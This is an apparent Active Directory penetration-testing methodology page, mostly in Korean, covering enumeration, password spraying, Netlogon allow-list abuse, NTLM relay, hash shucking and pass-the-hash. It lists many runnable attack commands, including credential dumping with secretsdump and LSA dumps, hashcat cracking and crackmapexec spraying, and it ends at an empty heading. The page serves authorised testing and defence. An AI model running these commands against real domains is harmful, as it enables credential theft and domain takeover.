# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory**는 **network administrators**가 네트워크 내의 **domains**, **users**, **objects**를 효율적으로 생성하고 관리할 수 있게 해주는 기반 기술이다. 대규모로 확장되도록 설계되어, 많은 수의 사용자를 관리 가능한 **groups**와 **subgroups**로 조직하면서 여러 수준의 **access rights**를 제어할 수 있다.

**Active Directory**의 구조는 세 가지 주요 계층으로 구성된다: **domains**, **trees**, **forests**. **domain**은 공통 데이터베이스를 공유하는 **users** 또는 **devices** 같은 객체들의 집합을 포함한다. **trees**는 공유 구조로 연결된 이러한 domains의 그룹이며, **forest**는 **trust relationships**로 상호 연결된 여러 trees의 집합을 나타내며 조직 구조의 최상위 계층을 형성한다. 각 수준마다 특정 **access** 및 **communication rights**를 지정할 수 있다.

**Active Directory**의 핵심 개념은 다음과 같다:

1. **Directory** – Active Directory objects와 관련된 모든 정보를 보관한다.
2. **Object** – **users**, **groups**, **shared folders**를 포함한 디렉터리 내의 엔티티를 의미한다.
3. **Domain** – 디렉터리 객체의 컨테이너 역할을 하며, 하나의 **forest** 내에 여러 domain이 공존할 수 있고 각 domain은 자체 객체 집합을 유지한다.
4. **Tree** – 공통 root domain을 공유하는 domains의 그룹이다.
5. **Forest** – Active Directory에서 조직 구조의 정점이며, 여러 trees와 그들 사이의 **trust relationships**로 구성된다.

**Active Directory Domain Services (AD DS)**는 네트워크 내 중앙 집중식 관리와 통신에 중요한 여러 서비스를 포함한다. 이러한 서비스는 다음과 같다:

1. **Domain Services** – 데이터 저장을 중앙화하고 **users**와 **domains** 간의 상호작용을 관리하며, **authentication** 및 **search** 기능을 포함한다.
2. **Certificate Services** – 보안 **digital certificates**의 생성, 배포, 관리를 담당한다.
3. **Lightweight Directory Services** – **LDAP protocol**을 통해 directory-enabled applications를 지원한다.
4. **Directory Federation Services** – 단일 세션에서 여러 웹 애플리케이션에 걸쳐 사용자를 인증할 수 있는 **single-sign-on** 기능을 제공한다.
5. **Rights Management** – 무단 배포와 사용을 제어하여 저작권 자료를 보호하는 데 도움을 준다.
6. **DNS Service** – **domain names**를 해석하는 데 필수적이다.

더 자세한 설명은 여기서 확인: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**AD를 공격**하는 방법을 배우려면 **Kerberos authentication process**를 정말 잘 **understand**해야 한다.\
[**작동 방식을 아직 모른다면 이 페이지를 읽어라.**](kerberos-authentication.md)

## Cheat Sheet

빠르게 어떤 명령으로 AD를 enumerate/exploit할 수 있는지 보려면 [https://wadcoms.github.io/](https://wadcoms.github.io)를 참고하면 된다.

> [!WARNING]
> Kerberos communication은 작업을 수행할 때 **full qualifid name (FQDN)** 을 요구한다. IP address로 machine에 접근하려고 하면 **NTLM을 사용하고 kerberos는 사용하지 않는다**.

## Recon Active Directory (No creds/sessions)

AD environment에 접근은 가능하지만 credentials/sessions가 없다면 다음을 할 수 있다:

- **Pentest the network:**
- 네트워크를 스캔하고, machine과 open ports를 찾아 **exploit vulnerabilities**를 시도하거나 그 안에서 **credentials**를 추출한다(예를 들어, [printers could be very interesting targets](ad-information-in-printers.md).
- DNS를 enumerate하면 web, printers, shares, vpn, media 등 domain 내 주요 서버에 대한 정보를 얻을 수 있다.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 이를 수행하는 방법에 대한 추가 정보는 일반 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)에서 확인할 수 있다.
- **smb services에서 null 및 Guest access를 확인**한다(이것은 최신 Windows 버전에서는 동작하지 않는다):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB server를 enumerate하는 더 자세한 가이드는 여기에서 찾을 수 있다:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP를 enumerate하는 더 자세한 가이드는 여기에서 찾을 수 있다(특히 **anonymous access**에 주의하라):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- [**Responder로 서비스인 척하며**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials를 수집
- [**relay attack을 악용하여**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host에 접근
- [**evil-S로 fake UPnP services를 노출하여**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) credentials를 수집
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 내부 문서, social media, 그리고 domain environment 내부의 서비스(주로 web), 또한 공개적으로 उपलब्ध한 자료에서 usernames/names를 추출한다.
- 회사 직원의 전체 이름을 찾았다면 다양한 AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/))를 시도해볼 수 있다. 가장 흔한 규칙은 다음과 같다: _NameSurname_, _Name.Surname_, _NamSur_ (각각 3글자), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3개의 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하라.
- **Kerbrute enum**: **invalid username**가 요청되면 서버는 **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_를 사용해 응답하며, 이를 통해 username이 유효하지 않음을 판단할 수 있다. **Valid usernames**는 **AS-REP** 응답에서 **TGT**를 반환하거나, 사용자가 pre-authentication을 수행해야 함을 나타내는 에러 _KRB5KDC_ERR_PREAUTH_REQUIRED_를 반환한다.
- **MS-NRPC에 대한 No Authentication**: domain controllers의 MS-NRPC (Netlogon) interface에 대해 auth-level = 1 (No authentication)을 사용한다. 이 방법은 MS-NRPC interface에 binding한 뒤 `DsrGetDcNameEx2` function을 호출하여 credentials 없이 user 또는 computer의 존재 여부를 확인한다. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool이 이러한 enumeration을 구현한다. 연구 자료는 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)에서 확인할 수 있다.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버 중 하나를 찾았다면, **user enumeration**도 수행할 수 있습니다. 예를 들어, 다음 도구를 사용할 수 있습니다 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> [**이 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 와 이것([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))에서 username 목록을 찾을 수 있습니다.
>
> 그러나, 이 전에 수행했어야 할 recon 단계에서 **회사에서 일하는 사람들의 이름**을 확보했어야 합니다. 이름과 성을 사용하면 스크립트 [**namemash.py**](https://gist.github.com/superkojiman/11076951)를 사용해 잠재적으로 유효한 usernames를 생성할 수 있습니다.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

**Zerologon**이 DC에서 패치된 이후에도, 명시적으로 allow-listed된 계정은 여전히 **legacy/vulnerable Netlogon secure-channel behavior**에 노출될 수 있습니다. 위험한 설정은 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** 또는 일치하는 registry 값 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** 입니다.

그 값은 **SDDL security descriptor** 입니다([Security Descriptors](security-descriptors.md) 참조). DACL에서 관련 ACE가 부여된 모든 계정이나 그룹이 대상이 될 수 있습니다. 예를 들어, `O:BAG:BAD:(A;;RC;;;WD)`는 사실상 **Everyone**을 allow-list에 넣습니다.

실전 operator workflow:

1. **SYSVOL/GPO**와 **live DC registry**를 모두 확인하여 allow-listed principals를 식별합니다.
2. SDDL에서 찾은 **SIDs**를 실제 AD users/computers로 해석하고, **DC machine accounts**, **trust accounts**, 그리고 다른 privileged machines를 우선순위로 둡니다.
3. allow-listed account로 **MS-NRPC / Netlogon authentication**을 반복적으로 시도합니다.
4. 성공적으로 맞히면, **Netlogon password-setting**을 악용해 target account password를 재설정합니다(public PoC는 이를 빈 문자열로 설정합니다).

공개 artifact에서의 빠른 triage / lab examples:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- **scanner**는 유효한 allow-list가 **SYSVOL**, **registry**, 또는 둘 다에 존재할 수 있기 때문에 유용합니다.
- exploit path 자체가 중요한 이유는 취약한 계정이 식별된 뒤에는 **Domain Admin 권한이 필요하지 않기** 때문입니다.
- `DC$`와 같은 **Domain Controller machine account**를 침해하는 것은 특히 위험합니다. 해당 비밀번호를 재설정하면 더 광범위한 **AD takeover** 경로를 직접 활성화할 수 있기 때문입니다.
- **Brute-force 실현 가능성**은 모드에 따라 다릅니다. 공개 artifact는 meet-in-the-middle 접근법, 다른 computer account를 사용할 수 있을 때의 **24-bit** brute force, 그리고 더 느린 **32-bit** 변형을 설명합니다.

Detection / hardening notes:

- allow-list 정책을 감사하고, 일시적이고 명시적으로 필요한 호환성 예외를 제외한 모든 항목을 제거하세요.
- 취약한 Netlogon 연결이 거부되거나, 발견되거나, 정책에 의해 명시적으로 허용되는 경우를 잡기 위해 DC **System** 이벤트 **5827/5828/5829/5830/5831**을 모니터링하세요.
- 기존 legacy dependency가 제거될 때까지 `VulnerableChannelAllowList`의 계정은 **high-risk**로 취급하세요.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC가 signing으로 차단**되어도, **LDAP** 보안 상태는 계속 확인하라: `netexec ldap <dc>`는 `(signing:None)` / 약한 channel binding을 강조한다. SMB signing은 필요하지만 LDAP signing이 비활성화된 DC는 **relay-to-LDAP** 대상로 여전히 유효하며, **SPN-less RBCD** 같은 abuse에 악용될 수 있다.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UI는 때때로 **마스킹된 admin password를 HTML에 포함**한다. 소스/devtools를 보면 평문이 드러날 수 있으며(예: `<input value="<password>">`), 이로써 Basic-auth로 scan/print repositories에 접근할 수 있다.
- 가져온 print jobs에는 사용자별 password가 포함된 **plaintext onboarding docs**가 들어 있을 수 있다. 테스트할 때는 pairings를 정확히 맞춰라:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use **powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

active directory를 열거하는 데 성공했다면 **더 많은 이메일과 네트워크에 대한 더 나은 이해**를 얻게 됩니다. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**를 강제로 유도할 수도 있습니다.**

### Looks for Creds in Computer Shares | SMB Shares

이제 기본 자격 증명이 있으므로 **AD 내부에서 공유되고 있는 흥미로운 파일을 찾을 수 있는지** 확인해야 합니다. 수동으로도 할 수 있지만, 아주 지루하고 반복적인 작업입니다(특히 확인해야 할 문서가 수백 개라면 더더욱 그렇습니다).

[**사용할 수 있는 도구에 대해 알아보려면 이 링크를 따르세요.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

다른 PC나 share에 **접근할 수 있다면**, (예: SCF file 같은) **파일을 배치**해서 누군가 그것에 접근할 때 **당신에게 NTLM authentication을 트리거**하도록 만들 수 있습니다. 그러면 **NTLM challenge를 훔쳐** 크랙할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점은 인증된 어떤 사용자라도 **domain controller를 compromise**할 수 있게 했습니다.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**다음 기술들에서는 일반 domain user만으로는 충분하지 않으며, 이러한 공격을 수행하려면 특별한 privileges/credentials가 필요합니다.**

### Hash extraction

아마도 [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 및 relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html)를 사용해 **local admin** 계정을 어느 정도 compromise했을 것입니다.\
그렇다면 이제 메모리와 로컬에 있는 모든 hash를 dump할 차례입니다.\
[**hash를 얻는 여러 방법에 대해 이 페이지를 읽어보세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**사용자 hash를 얻었다면**, 그것을 이용해 그 사용자를 **impersonate**할 수 있습니다.\
그 hash를 사용해 **NTLM authentication을 수행하는 tool**을 사용해야 하며, **또는** 새로운 **sessionlogon**을 생성한 뒤 그 hash를 **LSASS**에 **inject**할 수도 있습니다. 그러면 어떤 **NTLM authentication**이 수행되더라도 그 **hash가 사용됩니다.** 마지막 옵션이 mimikatz가 하는 방식입니다.\
[**자세한 내용은 이 페이지를 읽어보세요.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

이 공격은 일반적인 NTLM 프로토콜 기반 Pass The Hash의 대안으로, **사용자 NTLM hash를 사용해 Kerberos ticket을 요청**하는 것을 목표로 합니다. 따라서 **NTLM protocol이 비활성화되어 있고 Kerberos만 authentication protocol로 허용되는 네트워크**에서 특히 **유용**할 수 있습니다.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 공격 방식에서는 공격자가 password나 hash 값 대신 **사용자의 authentication ticket을 훔칩니다.** 그런 다음 이 stolen ticket을 사용해 **사용자를 impersonate**하고, 네트워크 내 resource와 service에 대한 무단 접근 권한을 얻습니다.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

**local administrator**의 **hash** 또는 **password**를 가지고 있다면 이를 사용해 다른 **PCs**에 **local login**을 시도해야 합니다.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **noisy** and **LAPS** would **mitigate** it.

### MSSQL Abuse & Trusted Links

사용자가 **MSSQL 인스턴스에 access**할 권한이 있다면, 이를 사용해 MSSQL 호스트에서 **commands를 execute**할 수 있고(SA로 실행 중인 경우), NetNTLM **hash**를 **steal**하거나 심지어 **relay** **attack**을 수행할 수도 있습니다.\
또한 MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰된다면(database link), 사용자가 그 trusted database에 대해 권한을 가지고 있을 때 **trust relationship을 사용해 다른 인스턴스에서도 queries를 execute**할 수 있습니다. 이러한 trust는 체인처럼 이어질 수 있으며, 어느 시점에는 사용자가 misconfigured database를 찾아 commands를 execute할 수 있을지도 모릅니다.\
**데이터베이스 간 link는 forest trust를 넘어도 동작합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

서드파티 inventory 및 deployment suite는 종종 credentials와 code execution으로 이어지는 강력한 경로를 노출합니다. 다음을 보세요:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)가 있는 Computer object를 찾고, 해당 computer에서 domain privileges를 가지고 있다면, 그 computer에 로그인하는 모든 users의 메모리에서 TGT를 dump할 수 있습니다.\
따라서 **Domain Admin이 그 computer에 login**하면, 그의 TGT를 dump해서 [Pass the Ticket](pass-the-ticket.md)을 사용해 impersonate할 수 있습니다.\
constrained delegation 덕분에 **자동으로 Print Server를 compromise**할 수도 있습니다(가능하면 DC일 것입니다).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

user 또는 computer가 "Constrained Delegation"을 허용받았다면, **특정 computer의 일부 services에 접근하기 위해 어떤 user든 impersonate**할 수 있습니다.\
그런 다음, 이 user/computer의 **hash를 compromise**하면 **어떤 user든 impersonate**할 수 있으며(도메인 admin도 포함), 일부 services에 접근할 수 있습니다.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 computer의 Active Directory object에 대해 **WRITE** 권한이 있으면, **elevated privileges**로 code execution을 얻을 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

compromised user가 일부 domain objects에 대해 **흥미로운 privileges**를 가지고 있을 수 있으며, 이를 통해 나중에 **lateral move**/**escalate** privileges를 할 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

domain 내에서 **Spool service가 listening 중인 것**을 발견하면, 이를 **abused**하여 **new credentials를 acquire**하고 **escalate privileges**할 수 있습니다.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse
